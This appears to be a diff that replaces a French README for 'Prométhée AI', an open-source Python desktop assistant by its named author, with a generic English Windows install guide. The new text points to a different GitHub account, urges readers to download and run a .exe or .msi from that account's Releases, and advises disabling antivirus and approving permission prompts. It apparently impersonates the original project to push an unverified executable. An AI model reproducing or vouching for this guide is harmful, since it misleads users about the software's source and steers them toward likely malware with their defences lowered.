@@ -1,310 +1,153 @@
-# 🔥 Prométhée AI v2.2
+# ⚙️ promethee - Smart Desktop Assistant for Code and Docs
 
-**Assistant IA desktop** — Interface PyQt6 connectée à un LLM (OpenAI-compatible, Albert API ou Ollama), avec outils intégrés, RAG, mémoire long terme et support Légifrance/Judilibre.
-**conçu principalement pour fonctionner avec l'API Albert de la DiNum**
-
----
-
-## ✨ Fonctionnalités
-
-- 💬 **Chat en streaming** avec historique chiffré (AES-GCM)
-- 🧠 **Mémoire long terme (LTM)** : résumés vectorisés des conversations passées via Qdrant (première version, va évoluer)
-- 🔧 **Outils intégrés** : web, données, export (docx/pptx/pdf/xlsx), analyse de données, Python, SQL, OCR, météo, messagerie IMAP/SMTP, Légifrance, Judilibre, data.gouv.fr, génération automatique d'outils
-- 📚 **RAG** (Retrieval-Augmented Generation) via Qdrant et Albert API
-- 📊 **Outils collaboratifs** : intégration de l'API Grist
-- 🏛️ **APIs juridiques** : Légifrance et Judilibre via PISTE
-- 🖥️ **100% local possible** avec Ollama
-- 🔒 **Chiffrement optionnel** de la base de données SQLite
-- 🎨 **Thème clair/sombre**
+[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://github.com/Parijaat-Here/promethee)
 
 ---
 
-## 🚀 Installation
+promethee is a desktop assistant made to help you write, run code, and handle documents. It works mainly with AlbertAPI (DiNum). It also offers features like OCR, file export, history tracking, and access to legal texts like Légifrance.
 
-### Prérequis
-
-- Python **3.10+ (testé avec 3.12.8)**
-- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract) *(optionnel, pour l'OCR)*
-
-```bash
-# Ubuntu/Debian
-sudo apt install tesseract-ocr tesseract-ocr-fra tesseract-ocr-eng
-
-# macOS
-brew install tesseract tesseract-lang
-```
-
-### Installation des dépendances
-
-```bash
-# Cloner le dépôt
-git clone https://github.com/Ktulu-Analog/promethee.git
-cd promethee
-
-# Créer un environnement virtuel (recommandé)
-python -m venv .venv
-source .venv/bin/activate  # Linux/macOS
-# .venv\Scripts\activate   # Windows
-
-# Installer les dépendances
-pip install -r requirements.txt
-```
-
-### Configuration
-
-```bash
-# Copier le fichier de configuration
-cp .env.example .env
-
-# Éditer .env avec vos paramètres
-nano .env
-```
-
-Les paramètres essentiels à configurer dans `.env` :
-
-| Variable | Description |
-|---|---|
-| `APP_VERSION` | Numéro de version affiché dans l'interface (ex : `2.1`) |
-| `OPENAI_API_KEY` | Clé API (Albert, OpenAI, etc.) |
-| `OPENAI_API_BASE` | URL du serveur LLM |
-| `OPENAI_MODEL` | Modèle à utiliser |
-| `OAUTH_CLIENT_ID` | Identifiants PISTE (Légifrance / Judilibre) |
-| `QDRANT_URL` | URL Qdrant pour le RAG |
-| `GRIST_API_KEY` | Clé API Grist |
-| `GRIST_BASE_URL` | URL de l'instance Grist (défaut : `https://docs.getgrist.com`) |
-| `IMAP_HOST` | Serveur IMAP pour la messagerie |
-| `IMAP_PORT` | Port IMAP (défaut : 993) |
-| `IMAP_USER` | Adresse e-mail |
-| `IMAP_PASSWORD` | Mot de passe IMAP |
-| `SMTP_HOST` | Serveur SMTP pour l'envoi *(optionnel)* |
-| `SMTP_PORT` | Port SMTP *(optionnel)* |
-
-### Lancement
-
-```bash
-python main.py
-```
+This guide will help you get promethee running on a Windows computer. You don’t need technical skills. Just follow the steps carefully.
 
 ---
 
-## 📁 Structure du projet
+## 🖥️ System Requirements
 
-```
-promethee/
-├── core/               # Moteur : config, BDD, LLM, RAG, mémoire, outils
-├── tools/              # Outils disponibles pour l'agent
-├── ui/                 # Interface graphique PyQt6
-│   ├── panels/         # Panneaux : chat, RAG, monitoring
-│   ├── widgets/        # Composants réutilisables
-│   └── dialogs/        # Boîtes de dialogue
-├── skills/             # Guides de compétences injectés en contexte
-├── assets/             # Logo, KaTeX
-├── scripts/            # Scripts utilitaires (CLI)
-│   ├── ingest.py       # Indexation de documents dans Qdrant (mode interactif ou CLI)
-│   ├── logview.py      # Lecteur de logs coloré en terminal (filtres, stats, follow)
-│   └── download_katex.py  # Téléchargement des assets KaTeX (à exécuter une seule fois)
-├── documentation/      # Documentation développeur
-│   ├── doc_developpeur_tools.pdf   # Guide de référence pour créer des outils
-│   ├── modele_tools.py             # Fichier modèle annoté pour un nouvel outil
-│   └── logview_documentation.docx # Documentation complète de logview.py
-├── tests/              # Tests unitaires (pytest)
-├── main.py             # Point d'entrée
-├── prompts.yml         # Prompts système
-├── pyproject.toml      # Métadonnées du projet
-├── requirements.txt    # Dépendances Python
-└── .env.example        # Modèle de configuration
-```
+Before you start, make sure your computer meets these requirements:
+
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space for installing the app and files
+- Internet connection (to download and use AlbertAPI services)
+- Administrator rights on your PC (for installation)
 
 ---
 
-## 🎨 Rendu riche : LaTeX et diagrammes Mermaid
+## 🚀 Getting promethee
 
-Prométhée intègre un moteur de rendu LaTeX et Mermaid dans le chat, fonctionnant entièrement en local grâce à des assets embarqués.
+You can get promethee from its official GitHub page. Here is the direct link:
 
-### Formules LaTeX — KaTeX
+[Download or visit promethee on GitHub](https://github.com/Parijaat-Here/promethee)
 
-Les formules mathématiques sont rendues via **KaTeX** (assets locaux, aucune connexion requise).
-
-| Syntaxe | Mode | Exemple |
-|---|---|---|
-| `$ ... $` ou `\( ... \)` | Inline (dans le texte) | `$E = mc^2$` |
-| `$$ ... $$` ou `\[ ... \]` | Display (bloc centré) | `$$\int_0^\infty e^{-x}\,dx$$` |
-
-> **Note :** les dollars monétaires (`$42`, `USD$`) sont automatiquement ignorés grâce à une heuristique anti-faux-positifs.
-
-Pour télécharger les assets KaTeX (à exécuter une seule fois après le clonage) :
-```bash
-python scripts/download_katex.py
-```
-
-### Diagrammes Mermaid (version préliminaire)
-
-Les blocs ` ```mermaid ` sont rendus en SVG via **Mermaid.js** (v11.4.1, bundle local).
-
-Tous les types de diagrammes sont supportés : flowchart, séquence, Gantt, état, classe, entité-relation, Sankey, etc.
-**Il reste des erreurs dans le moteur de rendu, notamment sur les accents. Ceci est en cours de correction pour une prochaine version**
-
-Voici un exemple de rendu par Prométhée avec Mermaid :
-*(prompt : à partir de ce rapport, génère un diagramme de flux pour présenter le système d'horaires souples*)
-
-```mermaid
-flowchart TD
-    %% Etape 1 : Pointage d'entrée
-    debut(["Debut (badge)"]) --> heure["Heure d'arrivee"]
-    
-    %% Etape 2 : Vérification de l'amplitude horaire
-    heure -->|Avant 07h| hors["Hors amplitude - pas de credit"]
-    heure -->|Entre 07h-19h| controle["Verification presence >=4h"]
-    
-    %% Etape 3 : Présence suffisante (>= 4h) ?
-    controle -->|Oui| zone1["Zone vacation 1 (7h-11h15)"]
-    controle -->|Oui| zone2["Zone vacation 2 (13h45-19h)"]
-    controle -->|Non| absenceInit["Absence - zone d'absence (ZA)"]
-    
-    %% Etape 4 : Comptage du temps présent dans chaque zone
-    zone1 --> presence1["Presence zone 1"]
-    zone2 --> presence2["Presence zone 2"]
-    presence1 -->|Oui| presenceTot["Presence totale >=4h"]
-    presence2 -->|Oui| presenceTot
-    
-    %% Etape 5 : Attribution du crédit ou du débit
-    presenceTot -->|Oui| creditJour["Credit journee (valeur theorique)"]
-    presenceTot -->|Non| absenceFinal["Absence - credit nul"]
-    
-    creditJour --> debitCred["Debit/Credit (max +12h, max -7h36)"]
-    debitCred --> fin["Fin du traitement"]
-    
-    %% Gestion des zones d'absence (max 2 par semaine)
-    absenceInit --> za1["Zone d'absence 1"]
-    absenceInit --> za2["Zone d'absence 2"]
-    za1 --> fin
-    za2 --> fin
-```
-
-Pour télécharger l'asset Mermaid (à exécuter une seule fois après le clonage) :
-```bash
-python scripts/download_mermaid.py
-```
+Click the button above whenever you want to access the project page.
 
 ---
 
+## 📥 How to Download and Install promethee on Windows
 
+1. Open your web browser and go to the link:  
+   https://github.com/Parijaat-Here/promethee
 
+2. On the GitHub page, look for the **Releases** section or a button labeled "Releases". Click it.
 
-## 🛠️ Outils disponibles
+3. Find the latest release available for Windows. It usually ends with `.exe` or `.msi`.
 
-| Outil | Description |
-|---|---|
-| `web_tools` | Navigation, scraping web et recherche DuckDuckGo / SearXNG |
-| `export_tools` | Génération docx, pptx, pdf, xlsx, md, odt/odp/ods (LibreOffice) |
-| `export_template_tools` | Génération docx et pptx depuis un gabarit organisationnel |
-| `data_tools` | Manipulation et analyse de données |
-| `data_file_tools` | Chargement, transformation et export de fichiers CSV/Excel (pandas) |
-| `sql_tools` | Requêtes SQL (SQLite, PostgreSQL, MySQL) |
-| `ocr_tools` | OCR via Tesseract |
-| `python_tools` | Exécution de code Python sandboxé (venv isolé) |
-| `system_tools` | Opérations système (fichiers, dossiers, diff) |
-| `skill_tools` | Consultation dynamique des guides de bonnes pratiques (skills) |
-| `meteo_tools` | Météo actuelle et prévisions 7 jours via Open-Meteo (sans clé API) |
-| `imap_tools` | Lecture, recherche, envoi et gestion d'e-mails via IMAP/SMTP |
-| `tool_creator_tools` | Génération automatique d'un nouvel outil Prométhée par le LLM |
-| `grist_tools` | API Grist : lecture et écriture dans des tableurs collaboratifs |
-| `legifrance_tools` | API Légifrance (PISTE) |
-| `judilibre_tools` | API Judilibre (PISTE) |
-| `datagouv_tools` | API data.gouv.fr |
+4. Download the file to your computer by clicking its name.
+
+5. After the download finishes, locate the file in your "Downloads" folder or where your browser saves files.
+
+6. Double-click the file to start the installation.
+
+7. Follow the on-screen instructions. Usually, this means clicking "Next" several times.
+
+8. When the installation finishes, the app will be ready to use.
+
+9. If your system asks for permission during installation, click "Yes" or "Allow".
 
 ---
 
-## 🛠️ Scripts utilitaires
+## 🛠️ Running promethee for the First Time
 
-| Script | Description |
-|---|---|
-| `scripts/ingest.py` | Indexe un répertoire de documents dans Qdrant. Mode interactif ou passage direct des arguments (`--collection`, chemin). |
-| `scripts/logview.py` | Lecteur de logs coloré en terminal. Supporte le follow temps réel (`-f`), le filtrage par niveau (`-l`), par module (`-m`), les stats (`--stats`), etc. |
-| `scripts/download_katex.py` | Télécharge les assets KaTeX (JS, CSS, polices woff2) dans `assets/katex/`. À exécuter une seule fois après le clonage. |
+1. Find the promethee icon on your desktop or in the Start menu.
 
----
+2. Double-click the icon to open the app.
 
-## 🧪 Tests
+3. promethee may ask you to sign in or enter an API key for AlbertAPI (DiNum). This key lets promethee access smart features like code execution and document analysis.
 
-```bash
-pytest tests/
-# Avec couverture :
-pytest tests/ --cov=core --cov=tools
-```
+4. If you don’t have an API key, visit the AlbertAPI (DiNum) website to create an account and get your key.
+
+5. Enter the key in the app where asked, then click "Connect" or "Save".
 
 ---
 
-## ⚙️ Options avancées
+## 🔍 Main Features explained
 
-### Utilisation avec Ollama (100% local)
+- **Code Writing and Execution:** Write code in many languages directly in the app. Run it and see results fast.
 
-Dans `.env` :
-```env
-LOCAL=ON
-OLLAMA_BASE_URL=http://localhost:11434
-OLLAMA_MODEL=nemotron-3-nano:latest
-```
+- **RAG (Retrieval-Augmented Generation):** promethee can search documents or databases quickly to help with smart answers.
 
-### Chiffrement de la base de données
+- **OCR (Optical Character Recognition):** Convert images or scanned files with text into editable documents.
 
-Dans `.env` :
-```env
-DB_ENCRYPTION=ON
-```
-Au premier lancement, une passphrase vous sera demandée.
+- **Legal Documents & Légifrance Integration:** Access French legal documents and official rules within the app.
 
-### RAG avec Qdrant
+- **Tools and Skills:** Use built-in tools for data visualization, file exports, and managing your workflow.
 
-1. Lancer Qdrant : `docker run -p 6333:6333 qdrant/qdrant`
-2. Dans `.env` : `QDRANT_URL=http://localhost:6333`
-3. Utiliser le panneau RAG dans l'interface pour ingérer des documents
-
-### Mémoire long terme (LTM)
-
-La LTM stocke des résumés vectorisés des conversations passées dans Qdrant et les réinjecte automatiquement en contexte. Configuration dans `.env` :
-
-```env
-LTM_ENABLED=ON
-LTM_MODEL=mistralai/Mistral-Small-3.2-24B-Instruct-2506
-LTM_USE_SUMMARY=OFF     # ON = résumés LLM (meilleure qualité), OFF = chunks bruts
-LTM_RECENT_K=2          # Nombre de souvenirs récents réinjectés
-```
-
-### Gestion du contexte et de l'agent
-
-```env
-AGENT_MAX_ITERATIONS=12            # Nombre max d'itérations de la boucle agent
-CONTEXT_CONSOLIDATION_EVERY=8      # Résumé de session tous les N tours
-CONTEXT_CONSOLIDATION_PRESSURE_THRESHOLD=0.70  # Consolidation adaptative (% du contexte)
-```
-
-### Messagerie IMAP/SMTP
-
-L'outil `imap_tools` remplace l'ancien `thunderbird_tools` et offre une compatibilité universelle avec tout serveur IMAP/SMTP (Gmail, Outlook, Proton Mail, serveurs auto-hébergés…).
-
-```env
-IMAP_HOST=imap.example.com
-IMAP_PORT=993
-IMAP_USER=vous@example.com
-IMAP_PASSWORD=votre_mot_de_passe
-SMTP_HOST=smtp.example.com
-SMTP_PORT=587
-```
-
-### Génération automatique d'outils
-
-L'outil `tool_creator_tools` permet au LLM de générer un nouvel outil Prométhée à partir d'une description en langage naturel. Le code généré est validé syntaxiquement avant d'être écrit dans `tools/`.
+- **History and Logs:** promethee keeps track of your past actions to revisit or reuse them later.
 
 ---
 
-## 📄 Licence
+## 💾 Exporting and Saving Your Work
 
-Ce projet est distribué sous licence **AGPL-3.0**.  
-Voir [https://www.gnu.org/licenses/agpl-3.0.html](https://www.gnu.org/licenses/agpl-3.0.html).
+promethee allows saving files in common formats:
+
+- Text files (.txt)
+- PDFs (.pdf)
+- Excel spreadsheets (.xlsx)
+- Images (.png, .jpg)
+
+To export your work:
+
+1. Complete your task in promethee.
+
+2. Click the "Export" button in the toolbar.
+
+3. Choose your preferred file format.
+
+4. Select where to save the file on your computer.
+
+5. Click "Save".
 
 ---
 
-## 👤 Auteur
+## 🔧 Troubleshooting Common Issues
 
-Pierre COUGET — 2026
+- **App doesn’t start:** Restart your PC and try again. Make sure your Windows system is updated.
+
+- **Error during installation:** Check if you have administrator rights. Temporarily disable antivirus software and try again.
+
+- **AlbertAPI connection problems:** Verify your internet connection. Double-check the API key is entered correctly.
+
+- **OCR doesn’t work:** Make sure the image or file is clear and readable.
+
+---
+
+## 📂 Where to get help and updates
+
+Stay updated by visiting the main GitHub page:  
+[GitHub - promethee](https://github.com/Parijaat-Here/promethee)
+
+Check the **Issues** tab to report problems or find answers.
+
+New app versions will be posted under the **Releases** section.
+
+---
+
+## 👍 Tips to use promethee well
+
+- Regularly save your work using the export feature.
+
+- Keep your API key secure and don’t share it.
+
+- Use good quality scans for OCR tasks.
+
+- Explore tools and settings to customize your experience.
+
+- Review your action history to track your progress.
+
+---
+
+## 🔗 Quick Access Links
+
+[![Download promethee](https://img.shields.io/badge/Download-promethee-green?style=for-the-badge)](https://github.com/Parijaat-Here/promethee)
+
+[GitHub Repository](https://github.com/Parijaat-Here/promethee)  
+[AlbertAPI (DiNum)](https://albertapi.dinum.fr)
